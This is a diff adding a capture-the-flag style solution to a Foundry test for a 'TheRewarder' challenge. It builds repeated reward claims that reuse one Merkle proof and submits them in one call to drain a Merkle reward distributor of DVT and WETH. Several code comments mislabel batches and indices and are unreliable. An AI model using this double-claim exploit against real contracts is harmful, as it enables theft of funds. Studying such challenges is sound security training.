@@ -148,7 +148,42 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 player_amount_dvt = 11524763827831882;
+        uint256 player_amount_weth = 1171088749244340;
+
+        uint256 txDvt = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_amount_dvt;
+        uint256 txWeth = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_amount_weth;
+        uint256 txTotal = txDvt + txWeth;
+
+        Claim[] memory claimsOfPlayer = new Claim[](txTotal);
+        for(uint i; i < txTotal; i++){
+            if(i < txDvt){
+                claimsOfPlayer[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: player_amount_dvt,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+                });  
+            }else{
+                claimsOfPlayer[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: player_amount_weth,
+                tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+                });
+            }
+        }
         
+        distributor.claimRewards({inputClaims: claimsOfPlayer, inputTokens: tokensToClaim});
+        weth.transfer(recovery, weth.balanceOf(player));
+        dvt.transfer(recovery, dvt.balanceOf(player));
     }
 
     /**
